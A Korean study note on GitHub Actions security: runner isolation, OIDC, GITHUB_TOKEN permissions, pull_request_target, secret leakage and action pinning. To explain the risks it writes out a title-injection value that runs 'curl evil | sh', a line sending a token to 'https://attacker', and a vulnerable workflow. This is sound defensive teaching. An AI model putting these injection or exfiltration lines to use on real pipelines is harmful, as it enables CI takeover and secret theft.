---
title: "러너와 보안 — self-hosted 러너, OIDC 인증, GITHUB_TOKEN 최소 권한, pull_request_target, 액션 핀 고정"
order: 5
level: 심화
summary: "GitHub-hosted 와 self-hosted 러너의 선택 기준과 self-hosted 의 격리·에페메럴·오토스케일(ARC), 장기 비밀 없이 클라우드에 인증하는 OIDC 의 동작(토큰 클레임·신뢰 정책·subject 조건), GITHUB_TOKEN 의 permissions 최소화, pull_request_target 과 포크 PR 의 코드 실행 위험, 시크릿 마스킹의 한계와 유출 경로, 서드파티 액션을 SHA 로 고정하고 허용 목록으로 제한하는 법, 이 저장소 CI 의 보안 점검"
tags: [self-hosted runner, ARC, OIDC, GITHUB_TOKEN, permissions, pull_request_target, 시크릿, 액션 핀 고정, SHA, 공급망]
experiments: []
---

CI 는 **코드를 실행하는 권한을 가진 시스템**이다. 저장소의 시크릿, 클라우드 자격 증명, 배포 권한이 모두 러너에서 만난다. 그래서 CI 보안은 세 질문으로 요약된다: **누가**(어떤 트리거·어떤 코드가) **어디서**(어떤 러너에서) **무엇으로**(어떤 토큰·권한으로) 실행되는가.

## 러너 — GitHub-hosted vs self-hosted

| | GitHub-hosted | self-hosted |
|---|---|---|
| 격리 | 잡마다 새 VM, 끝나면 폐기 | 기본은 **재사용** — 이전 잡의 흔적이 남는다 |
| 비용 | 분당 과금(프라이빗 저장소) | 인프라 비용 + 운영 |
| 네트워크 | 공용 | VPC 안 자원(사설 DB·레지스트리·클러스터) 접근 가능 |
| 하드웨어 | 정해진 SKU(ARM·GPU 는 larger runner) | 자유(GPU, 대용량 디스크, Mac) |
| 보안 책임 | GitHub | **나** — 패치, 이미지, 권한 |

self-hosted 를 쓰는 이유는 사설 네트워크 접근·특수 하드웨어·비용이다. 쓰기로 했다면 세 규칙:

1. **에페메럴**(`--ephemeral`): 잡 하나 끝나면 러너를 폐기한다. 재사용 러너는 이전 잡이 심은 악성 바이너리·캐시된 자격 증명이 다음 잡에 남는다.
2. **공개 저장소에는 절대 금지.** 포크 PR 의 코드가 내 인프라 안에서 실행된다. GitHub 문서가 명시적으로 경고한다.
3. **Kubernetes 위의 ARC**(Actions Runner Controller): 잡마다 Pod 를 띄우고 끝나면 지우는 오토스케일 러너. `AutoscalingRunnerSet` 로 min/max 를 두고, 러너 Pod 에 NetworkPolicy·PodSecurity 를 건다([보안 06](/security/notes/06-kubernetes-security)).

```yaml
# ARC: 잡당 Pod, 끝나면 폐기
apiVersion: actions.github.com/v1alpha1
kind: AutoscalingRunnerSet
metadata: { name: study-runners, namespace: arc-runners }
spec:
  githubConfigUrl: https://github.com/jaejinu/study
  githubConfigSecret: github-app                 # GitHub App 자격 증명 (PAT 보다 권장)
  minRunners: 0
  maxRunners: 5
  template:
    spec:
      containers:
        - name: runner
          image: ghcr.io/actions/actions-runner:latest
          securityContext: { runAsNonRoot: true, allowPrivilegeEscalation: false }
```

Docker 빌드가 필요하면 DinD(권한 컨테이너) 대신 **Kaniko/BuildKit rootless** 또는 별도 빌드 서비스를 쓴다. 권한 러너는 클러스터 전체를 내주는 것과 같다.

## OIDC — 장기 비밀 없이 클라우드에 인증한다

전통 방식: AWS 액세스 키를 저장소 시크릿에 넣는다. 키는 **영원히** 유효하고, 유출되면 누구나 쓸 수 있으며, 회전은 사람 손이다.

OIDC 방식: 잡이 실행될 때 GitHub 가 **짧게 사는 서명된 JWT** 를 발급한다. 클라우드는 GitHub 의 공개키로 서명을 검증하고, 토큰의 **클레임**(어느 저장소·브랜치·환경에서 왔나)이 신뢰 정책과 맞으면 **임시 자격 증명**을 내준다. 저장할 비밀이 없다.

```yaml
permissions:
  id-token: write          # OIDC 토큰 발급 권한
  contents: read
steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789012:role/study-deploy
      aws-region: ap-northeast-2
```

토큰 클레임 예:

```json
{
  "iss": "https://token.actions.githubusercontent.com",
  "sub": "repo:jaejinu/study:ref:refs/heads/main",
  "repository": "jaejinu/study", "ref": "refs/heads/main",
  "environment": "production", "actor": "jaejinu", "workflow": "Deploy",
  "aud": "sts.amazonaws.com", "exp": 1760600000
}
```

클라우드 쪽 신뢰 정책이 **핵심**이다. `sub` 를 느슨하게(`repo:jaejinu/*`) 두면 조직의 **어느 저장소든** 그 역할을 쓸 수 있다. 가장 좁게:

```json
{ "Condition": { "StringEquals": {
  "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
  "token.actions.githubusercontent.com:sub": "repo:jaejinu/study:environment:production"
}}}
```

`environment:production` 조건 + GitHub Environment 의 **필수 리뷰어** 를 걸면 "승인된 배포만 프로덕션 역할을 받는다" 가 된다. 같은 원리가 GCP Workload Identity Federation, Azure Federated Credentials, HashiCorp Vault JWT auth, 심지어 자체 서비스(JWKS 검증)에도 적용된다 — [보안 04 워크로드 신원](/security/notes/04-secrets-management).

## GITHUB_TOKEN — 기본 권한을 줄여라

모든 잡은 자동으로 `GITHUB_TOKEN` 을 받는다. 저장소 설정의 기본값이 "읽기·쓰기" 면, **의존성 하나가 탈취돼도** 코드를 푸시하고 릴리스를 만들고 이슈를 지울 수 있다.

```yaml
# 워크플로 최상위: 전부 끄고
permissions: {}

jobs:
  test:
    permissions:
      contents: read                 # 체크아웃만
  release:
    permissions:
      contents: write                # 태그·릴리스
      packages: write                # ghcr 푸시
      id-token: write                # cosign keyless 서명
```

저장소 Settings → Actions → "Workflow permissions" 를 **Read repository contents** 로 바꾸고, 필요한 잡에서만 올린다. 토큰은 잡이 끝나면 만료되고, 포크 PR 에서는 자동으로 읽기 전용이 된다.

## pull_request_target — 가장 흔한 CI 침해 경로

`pull_request` 이벤트는 포크 PR 에서 **시크릿 없이, 읽기 토큰으로** 돈다. 안전하다. 문제는 `pull_request_target`: **베이스 브랜치의 컨텍스트**(시크릿·쓰기 토큰)로 실행되면서, 워크플로가 PR 의 코드를 체크아웃하면 **공격자의 코드가 시크릿을 들고 실행**된다.

```yaml
# 위험한 패턴
on: pull_request_target
steps:
  - uses: actions/checkout@v4
    with: { ref: ${{ github.event.pull_request.head.sha } }   # ← PR 코드 체크아웃
  - run: pnpm install && pnpm test                             # ← postinstall 스크립트가 시크릿 탈취
```

`pull_request_target` 은 **PR 메타데이터만** 다룰 때(라벨 달기, 코멘트) 쓰고, PR 코드는 절대 실행하지 않는다. 코드를 테스트해야 하면 `pull_request` 로 하고, 시크릿이 필요한 단계는 **승인 후**(`environment` 리뷰어) 별도 워크플로로.

같은 계열의 함정:

- **스크립트 인젝션**: `run: echo "${{ github.event.pull_request.title }}"` — 제목에 `"; curl evil | sh; "` 를 넣으면 실행된다. 입력은 **환경 변수**로 받는다: `env: TITLE: ${{ ... }}` 후 `"$TITLE"`.
- **캐시 포이즈닝**: 포크 PR 이 기본 브랜치 캐시 키에 악성 파일을 넣어 두면 main 의 잡이 그것을 복원한다. 캐시 키에 브랜치를 포함하거나 PR 에서 `cache-to` 를 끈다.
- **아티팩트 신뢰**: 이전 잡의 아티팩트를 "검증된 것" 으로 간주하지 않는다.

## 시크릿 — 마스킹은 방어가 아니다

GitHub 는 로그에서 시크릿 값을 `***` 로 가린다. 하지만:

- base64 로 인코딩하거나 두 줄로 나누면 안 가려진다.
- `curl -d "$TOKEN" https://attacker` 는 로그에 안 나와도 **유출**이다.
- `set -x`, `env` 출력, 크래시 덤프, 테스트 리포트 아티팩트에 섞여 나간다.

그래서 **시크릿을 애초에 적게** 갖는다(OIDC), **잡 단위로** 노출을 좁히고(`environment` 시크릿), 포크 PR 엔 주지 않으며(기본), 유출 탐지(`gitleaks`, GitHub secret scanning + push protection)를 켠다. 조직 수준에서는 시크릿을 Vault/External Secrets 에서 **잡 실행 시점에** 받아 오는 쪽이 저장소 시크릿보다 낫다([보안 04](/security/notes/04-secrets-management)).

## 서드파티 액션 — 핀 고정과 허용 목록

`uses: some/action@v3` 는 **움직이는 태그**다. 메인테이너 계정이 털리면(2025년 tj-actions/changed-files 사건: 태그가 악성 커밋으로 옮겨져 수천 저장소의 시크릿이 로그로 유출됐다) 다음 실행부터 악성 코드가 돈다.

```yaml
# 태그 대신 커밋 SHA (주석으로 버전 표기, Dependabot/Renovate 가 갱신)
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
- uses: docker/build-push-action@ca877d9245402d1537745e0e356eab47c3520991 # v6.13.0
```

추가 통제:

- 저장소/조직 Settings → Actions → **허용 목록**: GitHub 제작 + 검증된 제작자 + 명시된 액션만.
- `permissions` 최소화는 액션 탈취 시 피해를 줄인다(토큰이 읽기 전용이면 푸시 못 함).
- 액션의 **소스를 읽어 본다.** 특히 `post` 훅, 네트워크 호출, `${{ }}` 사용.
- 가능하면 액션 대신 **스크립트 몇 줄**(`run:`)로 — 의존성이 하나 준다.

## 예시로 보기 — 이 저장소의 CI 점검

`.github/workflows/ci.yml` 을 위 기준으로 보면:

| 항목 | 현재 | 판정·제안 |
|---|---|---|
| 트리거 | `push: main`, `pull_request` | ✓ `pull_request_target` 없음 |
| `permissions` | 미지정 → 저장소 기본값 | ⚠ 최상위 `permissions: { contents: read }` 추가 |
| 액션 핀 | `@v4`, `@v6` 태그 | ⚠ SHA 로 고정 + Dependabot `github-actions` 생태계 활성화 |
| 시크릿 | 없음(공개 저장소, 배포 없음) | ✓ 배포를 추가할 땐 OIDC + environment |
| 러너 | ubuntu-latest | ✓ |
| 캐시 | `cache: pnpm`, buildx `type=gha` | ⚠ PR 에서 `cache-to` 는 포크 포이즈닝 고려(현재 공개 저장소라 포크 PR 은 캐시 쓰기 불가 — 기본 보호) |
| 스캔 | 없음 | 제안: `trivy` 이미지 스캔(`--exit-code 1 --severity CRITICAL`), `gitleaks`, CodeQL |

제안 워크플로 조각:

```yaml
permissions:
  contents: read
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha> # v4
      - uses: aquasecurity/trivy-action@<sha> # 0.29
        with: { scan-type: fs, severity: CRITICAL,HIGH, exit-code: "1", ignore-unfixed: true }
      - uses: gitleaks/gitleaks-action@<sha> # v2
```

## 실습 체크리스트

- [ ] 이 저장소 CI 에 최상위 `permissions: { contents: read }` 를 넣고 모든 잡이 여전히 통과하는지 확인
- [ ] 액션 3개를 SHA 로 고정하고 Dependabot 의 `github-actions` 업데이트를 켜기
- [ ] `pull_request_target` 로 PR 코드를 체크아웃하는 워크플로를 (테스트 저장소에서) 만들어 `postinstall` 로 환경 변수가 찍히는 것을 직접 보고, `pull_request` 로 바꿔 차단되는 것 확인
- [ ] kind 클러스터에 ARC 를 설치해 러너 Pod 가 잡마다 생겼다 사라지는 것 관찰
- [ ] 제목을 `"; echo pwned; "` 로 한 PR 로 스크립트 인젝션을 재현하고 환경 변수 전달로 고치기
